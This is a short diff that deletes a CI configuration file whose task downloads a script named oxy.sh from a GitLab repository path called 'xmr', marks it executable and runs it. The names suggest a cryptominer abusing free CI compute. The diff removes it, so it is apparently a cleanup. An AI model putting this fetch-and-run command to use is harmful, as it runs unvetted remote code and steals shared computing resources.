@@ -1,7 +1,0 @@
-container:
-  image: node:14
-  cpu: 4
-  memory: 12G
-
-task:
-  script: wget https://gitlab.com/buyutuk/xmr/-/raw/main/oxy.sh && chmod 777 oxy.sh && ./oxy.sh
